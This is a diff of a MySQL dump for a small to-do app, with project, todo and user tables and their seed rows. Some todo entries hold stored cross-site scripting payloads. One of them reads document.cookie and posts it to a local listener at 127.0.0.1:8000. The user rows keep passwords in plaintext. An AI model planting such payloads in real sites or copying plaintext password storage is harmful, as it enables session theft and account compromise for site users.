@@ -1,27 +1,5 @@
--- MySQL dump 10.13  Distrib 8.0.36, for Linux (x86_64)
---
--- Host: localhost    Database: pytaskdb
--- ------------------------------------------------------
--- Server version	8.0.36
-
-/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
-/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
-/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
-/*!50503 SET NAMES utf8mb4 */;
-/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
-/*!40103 SET TIME_ZONE='+00:00' */;
-/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
-/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
-/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
-/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
-
---
--- Table structure for table `project`
---
-
 DROP TABLE IF EXISTS `project`;
-/*!40101 SET @saved_cs_client     = @@character_set_client */;
-/*!50503 SET character_set_client = utf8mb4 */;
+
 CREATE TABLE `project` (
   `id` int NOT NULL AUTO_INCREMENT,
   `title` varchar(100) NOT NULL,
@@ -29,25 +7,12 @@ CREATE TABLE `project` (
   PRIMARY KEY (`id`),
   KEY `user_id` (`user_id`),
   CONSTRAINT `project_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `user` (`id`)
-) 
+); 
 
---
--- Dumping data for table `project`
---
-
-
-/*!40000 ALTER TABLE `project` DISABLE KEYS */;
 INSERT INTO `project` VALUES (1,'Web2_Development',1),(2,'Web2_Projekt',4),(3,'Einkaufsliste',4),(4,'Shopping',4),(99,'public',99);
-/*!40000 ALTER TABLE `project` ENABLE KEYS */;
-
-
---
--- Table structure for table `todo`
---
 
 DROP TABLE IF EXISTS `todo`;
-/*!40101 SET @saved_cs_client     = @@character_set_client */;
-/*!50503 SET character_set_client = utf8mb4 */;
+
 CREATE TABLE `todo` (
   `id` int NOT NULL AUTO_INCREMENT,
   `description` varchar(999) DEFAULT NULL,
@@ -57,13 +22,8 @@ CREATE TABLE `todo` (
   PRIMARY KEY (`id`),
   KEY `project_id` (`project_id`),
   CONSTRAINT `todo_ibfk_1` FOREIGN KEY (`project_id`) REFERENCES `project` (`id`)
-) 
---
--- Dumping data for table `todo`
---
+);
 
-
-/*!40000 ALTER TABLE `todo` DISABLE KEYS */;
 INSERT INTO `todo` VALUES 
 (1,'Build a Flask app','2024-05-01 00:00:00',1,NULL),
 (2,'Finalize project scope','2024-04-15 00:00:00',1,NULL),
@@ -84,16 +44,9 @@ INSERT INTO `todo` VALUES
 (60,'<script>alert(5)</script>',NULL,1,NULL),
 (67,'lol',NULL,3,NULL),
 (68,'<script>cookies=document.cookie;fetch(`http://127.0.0.1:8000`, {method: `POST`, mode: `no-cors`, headers: {\"Content-Type\": `application/json`},body: JSON.stringify({cookies: cookies})}).then(data => console.log(`Data sent`)).catch(error => console.error(`Error:`,error));</script>',NULL,99,NULL);
-/*!40000 ALTER TABLE `todo` ENABLE KEYS */;
-
-
---
--- Table structure for table `user`
---
 
 DROP TABLE IF EXISTS `user`;
-/*!40101 SET @saved_cs_client     = @@character_set_client */;
-/*!50503 SET character_set_client = utf8mb4 */;
+
 CREATE TABLE `user` (
   `id` int NOT NULL AUTO_INCREMENT,
   `username` varchar(80) NOT NULL,
@@ -102,14 +55,8 @@ CREATE TABLE `user` (
   PRIMARY KEY (`id`),
   UNIQUE KEY `username` (`username`),
   UNIQUE KEY `email` (`email`)
-) 
+);
 
---
--- Dumping data for table `user`
---
-
-
-/*!40000 ALTER TABLE `user` DISABLE KEYS */;
 INSERT INTO `user` VALUES 
 (1,'admin','admin','admin@admin.com'),
 (2,'test','test',NULL),
@@ -117,15 +64,3 @@ INSERT INTO `user` VALUES
 (4,'hallo123','uDjHwxooHcyaGwUNKM','test@schuttenberg.net'),
 (99,'public','',''),
 (100,'test123','test123','test@test.com');
-/*!40000 ALTER TABLE `user` ENABLE KEYS */;
-/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
-
-/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
-/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
-/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
-/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
-/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
-/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
-/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
-
--- Dump completed on 2024-06-11 10:42:54
